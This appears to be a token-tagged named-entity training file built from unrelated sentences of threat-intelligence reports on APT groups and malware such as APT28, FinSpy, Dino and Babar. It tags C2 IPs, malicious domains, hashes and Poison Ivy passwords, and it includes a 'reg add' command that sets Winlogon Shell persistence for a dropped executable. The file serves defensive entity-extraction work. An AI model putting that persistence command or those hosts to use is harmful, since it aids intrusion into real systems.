format	O
.	O

The	O
string	O
stacking	O
technique	O
is	O
used	O
to	O
make	O
analysis	O
more	O
difficult	O
so	O
that	O
the	O
strings	O
can	O
not	O
be	O
easily	O
discovered	O
by	O
malware	O
analysis	O
tools	O
such	O
as	O
XORSearch	O
.	O

While	O
tracking	O
APT28	B-malware.infosteal
,	O
we	O
noted	O
the	O
group	O
's	O
interest	O
in	O
foreign	O
governments	O
and	O
militaries	O
,	O
particularly	O
those	O
of	O
European	O
and	O
Eastern	O
European	O
nations	O
,	O
as	O
well	O
as	O
regional	O
security	O
organizations	O
,	O
such	O
as	O
the	O
North	O
Atlantic	O
Treaty	O
Organization	O
(	O
NATO	O
)	O
and	O
the	O
Organization	O
for	O
Security	O
and	O
Cooperation	O
in	O
Europe	O
(	O
OSCE	O
)	O
,	O
among	O
others	O
.	O

Path	O
User	O
agent	O
Method	O
https://46.183.218.37/	B-ip.unknown
community/wiki-self-signed/name-signed.php	O
Mozilla/5.0	O
(	O
Windows	O
NT	O
6.1	O
;	O
WOW64	O
;	O
rv:25.0	O
)	O
Gecko/20100101	O
Firefox/25.0	O
POST	O

The	O
original	O
e-mail	O
and	O
its	O
attachment	O
are	O
then	O
deleted	O
from	O
the	O
Bulgarian	O
e-mail	O
inbox	O
.	O

All	O
rights	O
reserved	O
.	O

svchost.exe	B-malware.drop
2013-06-15	O
23:08:19	O
UTC	O
Saudi	O
Arabia	O
VPN-Pro.exe	B-malware.drop
2013-06-15	O
22:45:33	O
UTC	O
Turkey	O
,	O
Saudi	O
Arabia	O
,	O
Morocco	O
Both	O
VPN-Pro.exe	B-malware.drop
and	O
svhost.exe	B-malware.drop
have	O
been	O
submitted	O
to	O
VirusTotal	O
:	O
Both	O
have	O
relatively	O
low	O
detection	O
rates	O
by	O
anti-virus	O
software	O
.	O

Putting	O
Babar	B-malware.drop
,	O
Bunny	B-malware.unknown
and	O
TFC	O
in	O
context	O
a	O
number	O
of	O
conclusion	O
can	O
be	O
drawn	O
.	O

T	O
he	O
tool	O
uses	O
open-source	O
intelligence	O
(	O
OSINT	O
)	O
.	O

The	O
division	O
in	O
malware	O
was	O
consistent	O
and	O
definitive	O
at	O
that	O
point	O
.	O

We	O
are	O
publishing	O
these	O
indicators	O
so	O
that	O
others	O
in	O
the	O
security	O
research	O
community	O
can	O
monitor	O
for	O
this	O
activity	O
and	O
potentially	O
correlate	O
against	O
other	O
campaigns	O
and	O
tools	O
that	O
are	O
being	O
investigated	O
.	O

Enterprises	O
should	O
consider	O
targeted	O
attacks	O
a	O
high-priority	O
threat	O
because	O
of	O
the	O
considerable	O
damage	O
they	O
incur	O
.	O

The	O
received	O
command	O
is	O
then	O
processed	O
by	O
the	O
ZxShell	B-malware.backdoor
function	O
with	O
the	O
ProcessCommand	O

We	O
do	O
n't	O
have	O
great	O
visibility	O
into	O
post­compromise	O
activity	O
at	O
this	O
stage	O
;	O
however	O
there	O
are	O
a	O
number	O
of	O
other	O
malware	O
samples	O
which	O
communicate	O
with	O
the	O
same	O
infrastructure	O
as	O
the	O
DownExecute	B-malware.infosteal
samples	O
.	O

For	O
example	O
,	O
in	O
Figure	O
3	O
,	O
link	O
analysis	O
is	O
being	O
used	O
to	O
track	O
the	O
identity	O
of	O
a	O
threat	O
actor	O
in	O
conjunction	O
with	O
his	O
known	O
Digital	O
DNATM	O
.	O

These	O
leverage	O
Silverlight	O
and	O
Flash	O
exploits	O
to	O
deliver	O
malware	O
.	O

Distribution	O
Double	O
extension	O
and	O
fake	O
icon	O
applications	O
(	O
Word	O
,	O
PDF	O
,	O
etc	O
)	O
Fake	O
installers	O
Technical	O
analysis	O
Execution	O
flow	O
overview	O
A	O
quick	O
word	O
on	O
control	O
flow	O
obfuscation	O
The	O
Dropper	O
Backdoor	O
component	O
:	O
rastlsc.exe	O
side-loading	O
Communication	O
Commands	O

0x000	O
0x001	O
0x002	O
0x003	O
0x007	O
0x027	O
0x079	O
0x179	O
0x279	O
0x379	O
0x3f9	O
0x400	O
0x401	O
byte	O
:	O
value	O
varies	O
in	O
each	O
version	O
0x01	O
:	O
hardcoded	O
byte	O
bool	O
:	O
is	O
elevation	O
token	O
present	O
dword	O
:	O
version	O
ID	O
string	O
(	O
UTF-16	O
)	O
,	O
computer	O
name	O
(	O
0x20	O
bytes	O
max	O
)	O
string	O
(	O
UTF-16	O
)	O
,	O
user	O
name	O
registry	O
query	O
result	O
of	O
the	O
HKLM\SOFTWARE\Microsoft\Windows	O
NT\	O
CurrentVersion	O
values	O
:	O
ProductName	O
,	O
CSDVersion	O
,	O
CurrentVersion	O
,	O
ReleaseId	O
,	O
CurrentBuildNumber	O
and	O
the	O
result	O
of	O
the	O
call	O
to	O

Where	O
these	O
files	O
were	O
found	O
and	O
the	O
context	O
of	O
their	O
use	O
needs	O
to	O
be	O
confirmed	O
,	O
but	O
could	O
provide	O
a	O
crucial	O
attributive	O
link	O
;	O
•	O
Use	O
of	O
unusual	O
ransomware	O
,	O
potentially	O
as	O
a	O
distraction	O
.	O

All	O
of	O
the	O
others	O
are	O
just	O
RETN	O
functions	O
that	O
do	O
nothing	O
.	O

Finally	O
,	O
the	O
dropper	O
deletes	O
itself	O
from	O
the	O
system	O
by	O
using	O
a	O
dissolving	O
batch	O
fi	O
le	O

It	O
seems	O
that	O
this	O
functionality	O
is	O
no	O
longer	O
automatically	O
used	O
for	O
some	O
unknown	O
reason	O
.	O

source	O
path/filename	O
:	O
1file	O
modified	O
:	O
06/16/2013	O
16:49:04	O
[	O
UTC	O
]	O
file	O
accessed	O
:	O
06/19/2013	O
22:00:22	O
[	O
UTC	O
]	O
file	O
created	O
:	O
06/19/2013	O
22:00:22	O
[	O
UTC	O
]	O
Target	O
flags	O
:	O
HasLinkTargetIDList	O
,	O
HasLinkInfo	O
,	O
HasRelativePath	O
,	O
Has	O
WorkingDir	O
,	O
HasArguments	O
,	O
HasIconLocation	O
,	O
IsUnicode	O
,	O
DisableLinkPathTracking	O
Target	O
attributes	O
:	O
FILE_ATTRIBUTE_ARCHIVE	O
Target	O
modified	O
:	O
07/17/2012	O
22:58:51.981	O
[	O
UTC	O
]	O
Target	O
accessed	O
:	O
07/17/2012	O
22:58:51.981	O
[	O
UTC	O
]	O
Target	O
created	O
:	O
07/17/2012	O
22:58:51.981	O
[	O
UTC	O
]	O
Target	O
ObjID	O
time	O
:	O
12/27/2012	O
10:55:02.540	O
[	O
UTC	O
]	O
File	O
offset	O
:	O
0x00000000	O
Parsed	O
size	O
:	O
0x000005b2	O
[	O
1458	O
bytes	O
]	O
Target	O
file	O
size	O
:	O
0x00003000	O
[	O
12288	O
bytes	O
]	O
Show	O
cmd	O
:	O
[	O
SW_SHOWNORMAL	O
]	O
ID	O
List	O
:	O
{	O
CLSID_MyComputer	O
}	O
\C:\Windows\System32\mshta.exe	O
Volume	O
Type	O
:	O
fixed	O
Volume	O
serial	O
num	O
:	O
7203-8b23	O
Volume	O
label	O
:	O
╟	O
ß	O
▐╤╒	O
╟	O
ßπ	O
═	O
ß	O
φ	O
:	O
C	O
Local	O
base	O
path	O
:	O
C:\Windows\System32\mshta.exe	O
Relative	O
path	O
:	O
..\..\..\Windows\System32\mshta.exe	O
Working	O
directory	O
:	O
C	O
:	O
\Windows\system32	O
Cmdline	O
args	O
:	O
Icon	O
filename	O
:	O
%	O
SystemRoot%\system32\SHELL32.dll	O
Special	O
Folder	O
ID	O
:	O
CSIDL_SYSTEM	O
Known	O
Folder	O
ID	O
:	O
1ac14e77-02e7-4e5d-b744-2eb1ae5198b7	O
NETBIOS	O
name	O
:	O
xp-pc	O
Volume	O
ID	O
:	O
32035a92-7032-4de3-846f-ed880ad23fa7	O
Object	O
ID	O
:	O
dd81bda8-5013-11e2-ab13-c0f8da734a02	O
MAC	O
address	O
:	O
c0	O
:	O
f8	O
:	O
da:73:4a:02	O
format	O
ID	O
[	O
value	O
]	O
:	O
{	O
b725f130-47ef-101a-a5f1-02608c9eebac	O
}	O
[	O
mshta.exe\	O
╪	O
o	O
┘	O
ä	O
╪	O
¬	O
╪╖╪	O
¿	O
┘	O
è	O
┘	O
é	O
]	O
format	O
ID	O
[	O
value	O
]	O
:	O
{	O
46588ae2-4cbc-4338-bbfc-139326986dce	O
}	O
[	O
S-1-5-21-1348441612-1947693625-1007466904-1000	O
]	O
format	O
ID	O
[	O
value	O
]	O
:	O
{	O
dabd30ed-0043-4789-a7f8-d013a4736622	O
}	O
[	O
System32	O
▲	O

The	O
group	O
appears	O
to	O
maintain	O
a	O
stockpile	O
of	O
stolen	O
certificates	O
and	O
deploys	O
their	O
downloaders	O
and	O
the	O
backdoors	O
signed	O
with	O
them	O
.	O

Another	O
interesting	O
point	O
is	O
the	O
Mikrotik	O
router	O
,	O
which	O
we	O
believe	O
was	O
hacked	O
specifically	O
for	O
the	O
campaign	O
.	O

Version	O

File	O
Name	O
:	O
adobe.dat	O
File	O
Size	O
:	O
22016	O
bytes	O
MD5	O
:	O
SHA1	O
:	O
PE	O
Time	O
:	O
PEID	O
Sig	O
:	O
Sections	O
(	O
4	O
)	O
:	O
Name	O
.text	O
.rdata	O
.data	O
.reloc	O
Entropy	O
6.46	O
4.62	O
s4.28	O
75d3d1f23628122a64a2f1b7ef33f5cf	B-hash
3d7b789e3a630c0bd9db0b3217f72348025b845c	B-hash
0x55372A7A	O
[	O
Wed	O
Apr	O
22	O
04:58:34	O
2015	O
UTC	O
]	O
Microsoft	O
Visual	O
C++	O
v6.0	O
DLL	O
5c3d9bac10a06111e2bb1356bce6140a	B-hash
69fc21366b719cab74f899fb18a8c26f	B-hash
bf619eac0cdf3f68d496ea9344137e8b	B-hash
4e2b7dd08fa32594616a1d463e9b0975	B-hash

To	O
do	O
so	O
,	O
it	O
alters	O
following	O
registry	O
values	O
:	O

The	O
PE	O
file	O
is	O
a	O
simple	O
HTA	O
script	O
compiled	O
into	O
an	O
executable	O
.	O

It	O
checks	O
for	O
mails	O
in	O
its	O
Bulgarian	O
e-mail	O
account	O
with	O
a	O
particular	O
subject	O
tag	O
.	O

The	O
distribution	O
server	O
has	O
been	O
resolved	O
to	O
an	O
IP	O
address	O
located	O
in	O
South	O
Korea	O
as	O
of	O
July	O
17	O
2017	O
,	O
when	O
we	O
fi	O
rst	O
isolated	O
the	O
initial	O
payload	O
.	O

Figure	O
2	O
:	O
Malicious	O
CHM	O
file	O
used	O
as	O
RATANKBA	B-malware.backdoor
lure	O

?	O
?	O

Upon	O
execution	O
,	O
it	O
will	O
write	O
two	O
files	O
to	O
disk	O
.	O

An	O
assessment	O
of	O
languages	O
spoken	O
by	O
region	O
based	O
on	O
the	O
most	O
recent	O
census	O
information	O
illustrates	O
the	O
permeation	O
of	O
the	O
Russian	O
language	O
in	O
that	O
region	O
and	O
highlights	O
the	O
value	O
of	O
providing	O
Russian	O
in	O
the	O
malicious	O
30.apk	B-malware.backdoor
application	O
.	O

This	O
recently	O
discovered	O
campaign	O
also	O
targets	O
government	O
agencies	O
in	O
the	O
Asia	O
Pacific	O
region	O
.	O

Ibid	O
.	O

During	O
our	O
investigation	O
we	O
were	O
able	O
to	O
identify	O
an	O
example	O
of	O
this	O
behavior	O
in	O
a	O
VirusTotal	O
report	O
on	O
one	O
of	O
the	O
domains	O
used	O
by	O
the	O
attackers	O
:	O
We	O
believe	O
this	O
URL	O
was	O
submitted	O
by	O
a	O
target	O
or	O
other	O
researchers	O
analyzing	O
the	O
malware	O
.	O

Visit	O
us	O
at	O
www.accenture.com	B-url.normal

This	O
then	O
is	O
a	O
surveillance	O
attack	O
in	O
progress	O
and	O
has	O
been	O
dubbed	O
'	O
Big	B-malware.infosteal
Bang	I-malware.infosteal
'	O
due	O
to	O
the	O
attacker	O
's	O
fondness	O
for	O
the	O
'	O
Big	O
Bang	O
Theory	O
'	O
TV	O
show	O
,	O
after	O
which	O
some	O
of	O
the	O
malware	O
's	O
modules	O
are	O
named	O
.	O

This	O
also	O
included	O
the	O
ScanBox	B-malware.infosteal
framework	O
's	O
own	O
detailed	O
reconnaissance	O
against	O
the	O
developer	O
themselves	O
.	O

We	O
already	O
presented	O
this	O
technique	O
in	O
our	O
G	O
DATA	O
SecurityBlog	O
article	O
about	O
the	O
Beta	O
Bot	O
.	O

Example	O
2	O
:	O
Cobalt	O
Strike	O
Beacon	O
embedded	O
in	O
obfuscated	O
PowerShell	O

Whilst	O
this	O
is	O
a	O
subject	O
which	O
is	O
clearly	O
of	O
key	O
interest	O
to	O
all	O
parties	O
in	O
the	O
region	O
,	O
the	O
fact	O
the	O
attackers	O
sent	O
an	O
Arabic	O
language	O
version	O
of	O
the	O
story	O
may	O
indicate	O
that	O
the	O
recipient	O
was	O
expected	O
to	O
be	O
fluent	O
in	O
Arabic	O
,	O
and	O
possibly	O
therefore	O
less	O
likely	O
to	O
be	O
Israeli	O
,	O
but	O
rather	O
someone	O
from	O
another	O
adjacent	O
region	O
.	O

The	O
following	O
files	O
have	O
been	O
seen	O
to	O
be	O
dumped	O
to	O
Babar	O
's	O
working	O
directory	O
under	O
%	O
APPDATA	O
%	O
\MSI	O
:	O
update.msi	O
48fe7f28.msi	O
0c6b5d2d.msi	O
31e50daa.msi	O
mpavdlta.vdm	O
Stolen	O
information	O
will	O
be	O
handled	O
by	O
the	O
Babar	B-malware.drop
main	O
instance	O
,	O
which	O
receives	O
data	O
through	O
six	O
named	O
pipes	O
from	O
other	O
instances	O
or	O
hooked	O
processes	O
.	O

Finally	O
,	O
China	B-malware.backdoor
Chopper	I-malware.backdoor
provides	O
command	O
shell	O
access	O
for	O
OS-level	O
interaction	O
,	O
further	O
demonstrating	O
its	O
versatility	O
.	O

This	O
variant	O
has	O
almost	O
identical	O
capabilities	O
as	O
the	O
previous	O
,	O
except	O
one	O
additional	O
functionality	O
:	O
It	O
collects	O
the	O
CPU	O
information	O
in	O
the	O
Win32_Processor	O
entry	O
via	O
WMI	O
request	O
(	O
Processor	O
ID	O
,	O
Name	O
,	O
Manufacturer	O
and	O
the	O
clock	O
speed	O
)	O
.	O

Image	O
4	O
.	O

reg	O
add	O
'	O
HKEY_CURRENT_USER\Software\Microsoft\Windows	O
NT\CurrentVersion\Winlogon	O
'	O
/v	O
'	O
Shell	O
'	O
/d	O
'	O
C:\WINDOWS\explorer.exe	O
,	O
C	O
:	O
\Documents	O
and	O
Settings\user\Local	O
Settings\Temp\atiapfxx.exe	O
'	O
/f	O

The	O
HOSTNAME	O
field	O
shown	O
in	O
Figure	O
7	O
was	O
programmed	O
in	O
my	O
custom	O
controller	O
to	O
display	O
'	O
Gh0st	B-malware.backdoor
variant	O
'	O
,	O
just	O
in	O
case	O
the	O
incoming	O
structure	O
parsed	O
from	O
the	O
victim	O
did	O
not	O
match	O
the	O
format	O
of	O
the	O
default	O
'	O
LOGININFO	O
'	O
structure	O
from	O
Gh0st	B-malware.backdoor
RAT	I-malware.backdoor
3.6	O
.	O

漏洞分析	O
(	O
5	O
)	O

APT28	B-malware.infosteal
continues	O
to	O
evolve	O
its	O
toolkit	O
and	O
refine	O
its	O
tactics	O
in	O
what	O
is	O
almost	O
certainly	O
an	O
effort	O
to	O
protect	O
its	O
operational	O
effectiveness	O
in	O
the	O
face	O
of	O
heightened	O
public	O
exposure	O
and	O
scrutiny	O
.	O

Israeli	O
military	O
and	O
defense	O
companies	O
.	O

As	O
of	O
today	O
,	O
the	O
correct	O
answer	O
would	O
be	O
four	O
.	O

Internal	O
name	O
:	O
esmina.dll	O
Compiled	O
:	O
Mon	O
Oct	O
10	O
14:47:28	O
2016	O
The	O
main	O
purpose	O
of	O
this	O
DLL	O
is	O
to	O
download	O
the	O
main	O
module	O
The	O
main	O
module	O
is	O
hosted	O
on	O
a	O
free	O
web	O
hosting	O
site	O
with	O
the	O
following	O
URL	O
:	O
windows-problem-reporting.site88.net	B-url.unknown
[	O
Note	O
:	O
Do	O
not	O
visit	O
this	O
malicious	O
site	O
.	O
]	O

[	O
redacted	O
]	O

Figure	O
18	O
:	O
Calling	O
memory	O
cleaner	O
function	O
Figure	O
18b	O
:	O
Calling	O
memory	O
cleaner	O
function	O

Another	O
domain	O
that	O
is	O
indirectly	O
linked	O
is	O
with	O
this	O
interesting	O
registration	O
information	O
.	O

We	O
expect	O
these	O
will	O
be	O
unique	O
identifiers	O
that	O
identify	O
malicious	O
transactions	O
initiated	O
by	O
the	O
attackers	O
.	O

6	O
,	O
2014	O
with	O
109	O
connections	O
.	O

case	O
'm	O
'	O
:	O

A	O
SSL/TLS	O
connection	O
is	O
used	O
as	O
an	O
effort	O
to	O
prevent	O
others	O
in	O
the	O
open	O
Internet	O
from	O
seeing	O
the	O
contents	O
of	O
a	O
communication	O
.	O

Figure	O
24	O
.	O

The	O
POST	O
stub	O
contains	O
encrypted	O
data	O
.	O

It	O
is	O
root9B	O
's	O
opinion	O
that	O
new	O
information	O
regarding	O
cybercrime	O
targeting	O
banks	O
makes	O
this	O
information	O
relevant	O
.	O

This	O
way	O
it	O
will	O
make	O
malicious	O
behaviors	O
look	O
legitimate	O
because	O
these	O
actions	O
are	O
made	O
by	O
the	O
trusted	O
executable	O
process	O
.	O

Figure	O
1	O
:	O
Chain	O
of	O
events	O
after	O
a	O
victim	O
opens	O
the	O
malicious	O
shortcut	O
file	O
until	O
the	O
host	O
gets	O
infected	O
with	O
Asruex	B-malware.drop
For	O
those	O
cases	O
that	O
JPCERT/CC	O
has	O
observed	O
,	O
when	O
the	O
shortcut	O
file	O
is	O
opened	O
,	O
a	O
downloader	O
is	O
downloaded	O
from	O
a	O
C	O
&	O
C	O
server	O
and	O
then	O
executed	O
.	O

supports	O
17	O
(	O
of	O
which	O
15	O
are	O
unique	O
)	O
commands	O
.	O

Key	O
Judgments	O
North	O
Korean	O
government	O
actors	O
,	O
specifically	O
Lazarus	O
Group	O
(	O
Intel	O
Card	O
)	O
,	O
continued	O
to	O
target	O
South	O
Korean	O
cryptocurrency	O
exchanges	O
and	O
users	O
in	O
late	O
2017	O
,	O
before	O
Kim	O
Jong	O
Un	O
's	O
New	O
Year	O
's	O
speech	O
and	O
subsequent	O
North-South	O
dialogue	O
.	O

Delineating	O
groups	O
and	O
activity	O
can	O
be	O
messy	O
,	O
and	O
there	O
appears	O
to	O
be	O
overlap	O
in	O
targeting	O
efforts	O
across	O
varying	O
groups	O
in	O
central	O
and	O
east	O
asia	O
throughout	O
2017	O
and	O
into	O
2018	O
.	O

So	O
,	O
querying	O
our	O
databases	O
for	O
this	O
particular	O
faked	O
certificate	O
returns	O
a	O
number	O
of	O
files	O
which	O
are	O
probably	O
the	O
products	O
of	O
our	O
Israel-hostile	O
attacker	O
.	O

He	O
was	O
probably	O
either	O
using	O
the	O
Windows	O
version	O
of	O
Secret	O
Chat	O
Point	O
or	O
its	O
web	O
interface	O
,	O
which	O
explains	O
was	O
urging	O
him	O
to	O
install	O
Android	O
Tweety	B-malware.backdoor
Chat	I-malware.backdoor
.	O

Simply	O
put	O
,	O
even	O
when	O
visiting	O
a	O
legitimate	O
company	O
distribution	O
site	O
,	O
IT	O
staff	O
was	O
downloading	O
and	O
installing	O
ICS-focused	O
malware	O
.	O

There	O
are	O
two	O
types	O
of	O
Derusbi	B-malware.backdoor
malware	O
:	O
a	O
client-server	O
model	O
and	O
a	O
server-client	O
model	O
.	O

JRat	B-malware.backdoor
is	O
low	O
cost	O
,	O
versatile	O
,	O
extensible	O
,	O
and	O
feature	O
rich	O
.	O

The	O
second	O
hash	O
(	O
1738ecf69b8303934bb10170bcef8926	B-hash
)	O
is	O
named	O
(	O
Benghazi.exe	O
)	O
and	O
have	O
detection	O
rate	O
of	O
21	O
out	O
of	O
56	O
(	O
37.5	O
%	O
)	O
and	O
has	O
been	O
uploaded	O
first	O
time	O
to	O
VirusTotal	O
on	O
23-04-2016	O
.	O

Figure	O
2.Cmwhite	B-malware.unknown
Tools	I-malware.unknown
Using	O
'	O
cgl-bin	O
'	O
within	O
HTTP	O
Requests	O
Cmstar	B-malware.unknown
's	O
HTTP	O
POST	O
requests	O
sent	O
to	O
'	O
happy.launchtrue[.]com	B-url.unknown
'	O
contain	O
data	O
that	O
the	O
Trojan	B-malware.backdoor
gathers	O
from	O
the	O
infected	O
machine	O
that	O
has	O
the	O
following	O
structure	O
:	O

The	O
goal	O
was	O
at	O
least	O
a	O
partial	O
reconstruction	O
of	O
the	O
events	O
precipitating	O
the	O
Shamoon	B-malware.unknown
attack	O
,	O
and	O
possibly	O
using	O
those	O
events	O
found	O
on	O
the	O
targeted	O
systems	O
to	O
determine	O
a	O
start	O
of	O
the	O
attack	O
,	O
and	O
a	O
possible	O
source	O
.	O

13	O
Sept	O
.	O

It	O
can	O
be	O
found	O
in	O
the	O
following	O
address	O
block	O
run	O
by	O
Ethio	O
Telecom	O
,	O
Ethiopia	O
's	O
stateowned	O
telecommunications	O
provider	O
:	O
IP	O
:	O
213.55.99.74	B-ip.unknown
route	O
:	O
213.55.99.0/24	O
descr	O
:	O
Ethio	O
Telecom	O
origin	O
:	O
AS24757	O
mnt-by	O
:	O
ETC-MNT	O
member-of	O
:	O
rs-ethiotelecom	O
source	O
:	O
RIPE	O
#	O
Filtered	O
The	O
server	O
appears	O
to	O
be	O
updated	O
in	O
a	O
manner	O
consistent	O
with	O
other	O
servers	O
,	O
including	O
servers	O
in	O
Bahrain	O
and	O
Turkmenistan	O
.	O

The	O
list	O
of	O
the	O
C	O
&	O
C	O
URLs	O
is	O
hardcoded	O
in	O
the	O
binary	O
but	O
may	O
be	O
overridden	O
by	O
further	O
commands	O
.	O

The	O
first	O
step	O
for	O
enrolling	O
a	O
device	O
is	O
to	O
install	O
the	O
certificate	O
authority	O
:	O
If	O
the	O
user	O
clicks	O
on	O
'	O
Allow	O
,	O
'	O
the	O
following	O
message	O
is	O
displayed	O
:	O
By	O
clicking	O
on	O
'	O
Install	O
,	O
'	O
the	O
signature	O
will	O
switch	O
to	O
'	O
Verified	O
:	O
'	O
The	O
device	O
is	O
ready	O
to	O
be	O
enrolled	O
:	O
We	O
can	O
control	O
the	O
installed	O
profile	O
:	O
The	O
attacker	O
is	O
now	O
able	O
to	O
control	O
the	O
device	O
.	O

2	O
)	O
In	O
the	O
Class_Terminate	O
function	O
,	O
again	O
assign	O
b	O
to	O
c	O
and	O
assign	O
0	O
to	O
b	O
to	O
balance	O
the	O
reference	O
count	O
.	O

A7BD555866AE1C161F78630A638850E7	B-hash
4F4BF27B738FF8F2A89D1BC487B054A8	B-hash
75D3D1F23628122A64A2F1B7EF33F5CF	B-hash
D9821468315CCD3B9EA03161566EF18E	B-hash
B9AF5F5FD434A65D7AA1B55F5441C90A	B-hash

This	O
consistent	O
evolution	O
beyond	O
standard	O
remote	O
code	O
execution	O
is	O
concerning	O
because	O
it	O
shows	O
determination	O
and	O
innovation	O
by	O
the	O
actor	O
.	O

However	O
,	O
they	O
have	O
been	O
in	O
circulation	O
for	O
a	O
longer	O
time	O
–	O
all	O
the	O
way	O
back	O
to	O
October	O
2011.I	O
think	O
it	O
is	O
logical	O
to	O
assume	O
that	O
all	O
these	O
have	O
been	O
part	O
of	O
a	O
medium/large	O
surveillance	O
operation	O
.	O

The	O
server	O
's	O
binary	O
gets	O
extracted	O
from	O
its	O
own	O
resource	O
section	O
and	O
is	O
written	O
to	O
the	O
\Windows\System32	O
folder	O
with	O
the	O
name	O
of	O
the	O
installed	O
service	O
(	O
'	O
Oracle.exe	O
'	O
)	O
.	O

The	O
sample	O
is	O
similar	O
to	O
a	O
previously	O
analyzed	O
sample	O
of	O
FinSpy	B-malware.backdoor
malware	O
sent	O
to	O
activists	O
in	O
Bahrain	O
in	O
2012	O
.	O

All	O
three	O
of	O
these	O
methods	O
have	O
been	O
used	O
to	O
spread	O
malware	O
inside	O
LANs	O
.	O

Knowing	O
the	O
obfuscation	O
routines	O
for	O
this	O
data	O
we	O
wrote	O
a	O
script	O
to	O
extract	O
the	O
URLs	O
/	O
IPs	O
and	O
ports	O
stored	O
.	O

We	O
believe	O
a	O
separate	O
third	O
group	O
may	O
also	O
be	O
employing	O
these	O
tools	O
,	O
but	O
we	O
do	O
not	O
have	O
sufficient	O
insight	O
in	O
to	O
this	O
additional	O
group	O
at	O
this	O
time	O
.	O

In	O
testing	O
the	O
the	O
Java	O
Applet	O
pops	O
up	O
a	O
notification	O
to	O
the	O
user	O
asking	O
them	O
if	O
they	O
want	O
to	O
run	O
the	O
applet	O
.	O

Figure	O
2	O
.	O

Although	O
traditional	O
overhead	O
intelligence	O
surveillance	O
and	O
reconnaissance	O
(	O
ISR	O
)	O
assets	O
were	O
likely	O
still	O
needed	O
to	O
finalize	O
tactical	O
movements	O
,	O
the	O
ability	O
of	O
this	O
application	O
to	O
retrieve	O
communications	O
and	O
gross	O
locational	O
data	O
from	O
infected	O
devices	O
,	O
could	O
provide	O
insight	O
for	O
further	O
planning	O
,	O
coordination	O
,	O
and	O
tasking	O
of	O
ISR	O
,	O
artillery	O
assets	O
,	O
and	O
fighting	O
forces	O
.	O

Encrypted	O
on­disk	O
copy	O
for	O
Dino	B-malware.backdoor
modules	O
Configuration	O
storage	O
CRONTAB	O
Task	O
scheduler	O
FMGR	O
File	O
upload	O
and	O
download	O
manager	O
Command	O
execution	O
manager	O
CMDEXEC	O
CMDEXECQ	O
Storage	O
queue	O
for	O
commands	O
to	O
execute	O
ENVVAR	O
Storage	O
for	O
environment	O
variables	O
Dino	B-malware.backdoor
heavily	O
relies	O
on	O
a	O
custom	O
data	O
structure	O
named	O
'	O
DataStore	O
'	O
by	O
the	O
Animal	O
Farm	O
developers	O
.	O

Our	O
new	O
scan	O
identified	O
a	O
total	O
of	O
36	O
FinSpy	B-malware.backdoor
servers	O
,	O
30	O
of	O
which	O
were	O
new	O
and	O
6	O
of	O
which	O
we	O
had	O
found	O
during	O
previous	O
scanning	O
.	O

This	O
is	O
an	O
undocumented	O
behavior	O
in	O
Microsoft	O
Windows	O
.	O

Once	O
the	O
malware	O
validates	O
the	O
C2	O
connection	O
then	O
the	O
malware	O
creates	O
an	O
XML	O
file	O
(	O
SQLite.xml	O
)	O
inside	O
which	O
it	O
stores	O
the	O
user	O
name	O
and	O
the	O
password	O
to	O
communicate	O
with	O
the	O
C2	O
server	O
.	O

suggests	O
active	O
engagement	O
with	O
the	O
malware	O
and	O
targets	O
.	O

Drop	O
&	O
Execute	O
payload	O
:	O
The	O
payload	O
URL	O
is	O
fetched	O
from	O
a	O
hardcoded	O
Pastebin	O
paste	O
address	O
:	O
We	O
observed	O
two	O
different	O
payloads	O
dropped	O
by	O
the	O
malware	O
:	O

0x406EC3	O
:	O
817DE800010000	O
CMP	O
DWORD	O
PTR	O
[	O
EBP-0x18	O
]	O
,0x100	O

aspnet_client/report.asp	O
Resource/device_Tr.asp	O
images/device_index.asp	O
news/media/info.html	O
backsangho.jpg	O
addCats.asp	O
SmartNav.jpg	O
nblogo2.jpg	O

0dd7da89b7d1fe97e669f8b4156067c8	B-hash
N/A	O

The	O
team	O
then	O
reverse-engineered	O
the	O
code	O
to	O
analyze	O
its	O
various	O
components	O
(	O
decoy	O
documents	O
used	O
in	O
phishing	O
attacks	O
,	O
droppers	O
,	O
main	O
module	O
,	O
microphone	O
module	O
,	O
etc	O
.	O
)	O

Individual	O
countries	O
within	O
the	O
Indo-Pak	O
subcontinent	O
are	O
increasingly	O
involved	O
in	O
cyber	O
attacks	O
and	O
targeted	O
espionage	O
campaigns	O
.	O

Value	O

Given	O
the	O
set	O
of	O
commands	O
it	O
can	O
receive	O
,	O
Dino	B-malware.backdoor
's	O
main	O
goal	O
seems	O
to	O
be	O
the	O
exfiltration	O
of	O
files	O
from	O
its	O
targets	O
.	O

struct	O
PCCCMDPacketHeader	O
DWORD	O
dwPacketSize	O
;	O
DWORD	O
field_4	O
;	O
//	O
purpose	O
unknown	O
,	O
seemingly	O
unused	O
.	O

The	O
fact	O
that	O
the	O
attacker	O
was	O
also	O
able	O
to	O
get	O
devices	O
onto	O
his	O
own	O
malicious	O
MDM	B-malware.infosteal
shows	O
that	O
the	O
attacker	O
was	O
indeed	O
motivated	O
to	O
obtain	O
initial	O
access	O
but	O
also	O
to	O
maintain	O
persistence	O
across	O
the	O
devices	O
.	O

First	O
,	O
the	O
attacker	O
's	O
mission	O
is	O
to	O
disrupt	O
an	O
operational	O
process	O
rather	O
than	O
steal	O
data	O
.	O

The	O
Poison	O
Ivy	O
passwords	O
observed	O
for	O
the	O
group	O
were	O
'	O
admin2014	O
'	O
and	O
'	O
admin	O
!	O
@	O
#	O
$	O
%	O
'	O
.	O

So	O
the	O
accessible	O
memory	O
space	O
for	O
the	O
array	O
is	O
from	O
0x00000000	O
to	O
0x7ffffffff*1	O
.	O

On	O
February	O
28	O
,	O
the	O
McAfee	O
Advanced	O
Threat	O
Research	O
team	O
discovered	O
that	O
the	O
cybercrime	O
group	O
Hidden	B-malware.unknown
Cobra	I-malware.unknown
continues	O
to	O
target	O
cryptocurrency	O
and	O
financial	O
organizations	O
.	O

9-	O
http://thesaker.is/ukrainian-army-losses-in-ato-anti-terrorist-operation-according-to-the-iisss-military-balance/	B-url.unknown
10-For	O
more	O
information	O
,	O
see	O
'	O
Origin	O
of	O
Artillery	O
Attacks	O
on	O
Ukrainian	O
Military	O
Positions	O
in	O
Eastern	O
Ukraine	O
between	O
14	O
July	O
2014	O
and	O
8	O
August	O
2014	O
,	O
'	O
https://www.bellingcat.com/news/uk-and-europe/2015/02/17/	B-url.unknown
origin-of-artillery-attacks/	I-url.unknown
.	O
'	O

The	O
malware	O
file	O
is	O
compiled	O
Python	O
code	O
.	O

11	O
Aug	O
2016	O
10:10	O
AM	O
.	O

Based	O
on	O
the	O
responses	O
received	O
from	O
the	O
control	O
server	O
,	O
the	O
malware	O
